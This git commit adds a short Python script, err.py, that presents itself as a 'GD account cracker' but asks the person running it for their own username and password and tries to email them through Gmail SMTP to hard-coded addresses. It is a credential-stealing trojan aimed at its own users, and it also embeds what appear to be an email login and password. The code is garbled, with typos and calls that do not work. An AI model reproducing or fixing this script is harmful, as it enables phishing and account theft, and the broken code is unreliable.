3405399358850e0f46690001d13b15a615a9a443
joeisme1 <48613468+joeisme1@users.noreply.github.com>
2019-06-08 08:15:08 -0700

    Add files via upload

---
+++ err.py
@@ -0,0 +1,18 @@
+print("welcome to Gd theive")
+print("the GD account cracker")
+print("log in with your GD account")
+uname = raw_input("enter username: ")
+pword = raw_input("enter password: ")
+print("hacking...")
+import smtplib
+content = ("pword + uname")
+with smtplib.SMTP("smtp.gmail.com:587") as smtp:
+     smtp.ehlo()
+     smtp.starttls()
+     smpt.ehlo
+     subject = ("GD password found")
+     body = pword + uname
+     msg = f("Subject: {subject}\n\n{body}")
+     smtp.login("cringybananamail@gmail.com,cringemail")
+     smtp.sendmail("cringybananamail@gmail.com,jearljsmith@gmail.com,msg")
+     smtp.close()
